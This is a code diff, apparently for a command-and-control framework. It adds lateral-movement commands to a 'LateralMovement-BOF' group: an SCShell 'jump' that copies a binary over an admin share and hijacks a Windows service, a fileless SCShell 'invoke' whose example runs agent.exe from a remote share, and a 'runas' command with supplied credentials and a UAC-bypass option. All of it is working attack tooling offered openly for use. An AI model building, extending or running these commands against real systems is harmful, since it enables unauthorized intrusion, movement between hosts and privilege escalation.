@@ -30,8 +30,40 @@ _cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
+
+
+
+var _cmd_jump_scshell = ax.create_command("scshell", "Attempt to spawn a session on a remote target via SCShell", "jump scshell 192.168.0.1 /tmp/agent_svc.exe -b update.exe -s C$ -p C:\\Windows -n defragsvc");
+_cmd_jump_scshell.addArgFlagString( "-b", "binary_name",     "Remote binary name", "random");
+_cmd_jump_scshell.addArgFlagString( "-s", "share",           "Share for copying the file", "ADMIN$");
+_cmd_jump_scshell.addArgFlagString( "-p", "svc_path",        "Path to the service file", "C:\\Windows");
+_cmd_jump_scshell.addArgFlagString( "-n", "svc_name",        "Service name to modify", "defragsvc");
+_cmd_jump_scshell.addArgString("target", true);
+_cmd_jump_scshell.addArgFile("binary", true);
+_cmd_jump_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target          = parsed_json["target"];
+    let binary_content  = parsed_json["binary"];
+    let share           = parsed_json["share"];
+    let binary_name     = parsed_json["binary_name"];
+    let svc_path        = parsed_json["svc_path"];
+    let svc_name        = parsed_json["svc_name"];
+
+    if (binary_name == "random")  binary_name = ax.random_string(8, "alphabetic") + ".exe";
+
+    let remote_unc_path = `\\\\${target}\\${share}\\${binary_name}`;
+    let local_path_on_target = `${svc_path}\\${binary_name}`;
+
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,bytes", [target, svc_name, remote_unc_path, binary_content]);
+    let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
+    let message = `Task: Jump to ${target} via SCShell (service: ${svc_name}, binary: ${binary_name})`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
 var cmd_jump = ax.create_command("jump", "Attempt to spawn a session on a remote target with the specified method");
-cmd_jump.addSubCommands([_cmd_jump_psexec]);
+cmd_jump.addSubCommands([_cmd_jump_psexec, _cmd_jump_scshell]);
 
 
 
@@ -48,8 +80,29 @@ _cmd_invoke_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
+
+
+
+var _cmd_invoke_scshell = ax.create_command("scshell", "Use SCShell to execute commands on other systems by modifying service binary path (fileless)", "invoke scshell 10.0.2.10 defragsvc \"cmd.exe /c \\\\10.0.2.1\\share\\agent.exe\"");
+_cmd_invoke_scshell.addArgString("target", true);
+_cmd_invoke_scshell.addArgString("service", true);
+_cmd_invoke_scshell.addArgString("payload", true);
+_cmd_invoke_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target = parsed_json["target"];
+    let service = parsed_json["service"];
+    let payload = parsed_json["payload"];
+
+    let bof_params = ax.bof_pack("cstr,cstr,cstr", [target, service, payload]);
+    let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
+    let message = `Task: Invoke SCShell on ${target} (service: ${service})`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
 var cmd_invoke = ax.create_command("invoke", "Attempt to execute a command on a remote target with the specified method");
-cmd_invoke.addSubCommands([_cmd_invoke_winrm]);
+cmd_invoke.addSubCommands([_cmd_invoke_winrm, _cmd_invoke_scshell]);
 
 
 
@@ -102,7 +155,35 @@ cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);
 
 
 
-var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token]);
+var cmd_runas = ax.create_command("runas", "Run a command as another user using explicit credentials (RunasCs-like)", "runas admin P@ssword domain.local \"cmd /c whoami\" -l 9 -t 30000 -o -b");
+cmd_runas.addArgString("username", true, "Username for authentication");
+cmd_runas.addArgString("password", true, "Password for authentication");
+cmd_runas.addArgString("domain", true, "Domain (use '.' for local)");
+cmd_runas.addArgString("command", true, "Command line to execute");
+cmd_runas.addArgFlagInt("-l", "logon_type", "Logon type: 2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials", 2);
+cmd_runas.addArgFlagInt("-t", "timeout", "Timeout in milliseconds to wait for process output (default: 120000)", 0);
+cmd_runas.addArgBool("-o", "With output capture");
+cmd_runas.addArgBool("-b", "Bypass UAC (use with admin credentials)");
+cmd_runas.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let username   = parsed_json["username"];
+    let password   = parsed_json["password"];
+    let domain     = parsed_json["domain"];
+    let command    = parsed_json["command"];
+    let logon_type = parsed_json["logon_type"];
+    let timeout    = parsed_json["timeout"];
+    let no_output  = parsed_json["-o"] ? 0 : 1;
+    let bypass_uac = parsed_json["-b"] ? 1 : 0;
+
+    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,int,int,int,int", [username, password, domain, command, logon_type, timeout, no_output, bypass_uac]);
+    let bof_path = ax.script_dir() + "_bin/runas." + ax.arch(id) + ".o";
+    let message = `Task: runas ${domain}\\${username} -> '${command}'`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
+var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token, cmd_runas]);
 ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);
 
 
